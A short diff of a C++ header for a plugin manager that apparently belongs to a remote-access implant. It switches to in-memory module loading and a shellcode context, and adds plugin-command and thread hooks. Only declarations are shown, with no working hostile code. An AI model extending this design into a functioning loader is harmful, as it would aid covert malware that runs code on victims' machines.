@@ -15,13 +15,13 @@ class PluginInterface;
 class plugin{
     public:
         ulong ID;
-        HINSTANCE hModule;
+        MEMORYMODULE Module;
         PluginInterface* plugInterface;
 };
 class PluginManagerInterfacePrivate;
 class RPEP;
 class PluginManager{
-        LoaderFunTable* lFunc;
+        SHELLCODE_CONTEXT* Context;
         RPEP* protocol;
         static PluginManagerInterfacePrivate* pluginList;
     public:
@@ -38,9 +38,12 @@ class PluginManager{
         bool updateServer(DArray& newServer);
         bool stopServer();
 
-        uint run(SOCKET hConexion, HCRYPTKEY hKey, LoaderFunTable &lFunc);
+        uint run(SHELLCODE_CONTEXT *Context);
+        bool runPluginCMD(ulong pluginID,char* data,uint size);
         plugin* getPluginById(ulong id);
         RPEP* getProtocol();
+
+        static int pluginThread(void*);
 };
 
 //extern PluginManager PlugMgr;
